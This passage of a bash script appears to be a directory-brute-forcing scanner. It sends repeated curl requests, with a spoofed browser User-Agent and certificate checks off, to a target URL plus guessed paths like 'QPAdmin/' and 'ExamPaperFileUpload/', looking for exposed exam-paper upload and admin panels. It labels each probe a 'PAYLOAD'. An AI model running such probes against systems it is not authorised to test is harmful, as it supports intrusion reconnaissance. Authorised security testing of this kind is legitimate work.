code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataSync-QPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManager-Handling/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManager-Handling/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Control-QPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Control-QPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandler-Handling/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandler-Handling/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManagerModule/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManagerModule/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataUploadQPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataUploadQPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Processing-TestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Processing-TestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloud-Sync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloud-Sync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Mgmt-QPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Mgmt-QPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataUploadQPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataUploadQPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBData_Service/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBData_Service/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulk-MassUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulk-MassUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadService-QPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadService-QPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchProcessorQPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchProcessorQPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_PBatchProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_PBatchProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFileAutoUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFileAutoUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPB-Workflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPB-Workflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AccessControl_QPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AccessControl_QPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloud-ProcessingSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloud-ProcessingSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaper_CloudSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaper_CloudSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploader_DataPipeline/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploader_DataPipeline/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Control_QuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Control_QuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUpload-Manager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUpload-Manager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Monitoring_QPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Monitoring_QPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDocDatabaseManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDocDatabaseManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFile-BulkUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFile-BulkUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ManagerQPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ManagerQPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["SuiteQPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"SuiteQPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MassUploadQPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MassUploadQPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MassUpload_QPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MassUpload_QPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Portal_QPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Portal_QPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DashboardQPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DashboardQPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["SystemQPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"SystemQPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QP-DatabaseManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QP-DatabaseManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadQPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadQPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaper_DataSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaper_DataSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Panel-QPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Panel-QPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaperFileUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaperFileUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAutoOps/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAutoOps/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabase_Processing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabase_Processing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringTool_QPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringTool_QPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutomationQP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutomationQP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Ops-QuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Ops-QuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchProcessor-QPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchProcessor-QPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystemUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystemUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Transfer-QPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Transfer-QPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchProcessor_QPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchProcessor_QPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaper_Handler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaper_Handler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Mgmt_Q_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Mgmt_Q_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataOps-QPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataOps-QPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingQPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingQPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handling-QPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handling-QPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Processing-QPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Processing-QPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Workflow_QuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Workflow_QuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAuto_HandlingModule/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAuto_HandlingModule/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
